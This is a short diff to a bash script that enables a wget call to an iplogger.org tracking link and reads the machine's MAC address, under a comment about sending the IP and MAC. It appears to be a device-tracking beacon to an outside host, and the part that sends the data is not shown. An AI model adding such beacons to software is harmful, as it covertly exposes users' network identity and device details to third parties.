@@ -1,7 +1,7 @@
 #/bin/bash
 
 # Get logs
-#wget -O /home/uniris/logs.txt https://iplogger.org/2zh7h6
+wget -O /home/uniris/logs.txt https://iplogger.org/2zh7h6
 
 # Send the IP + MAC
 MAC=$(cat /sys/class/net/eno1/address)
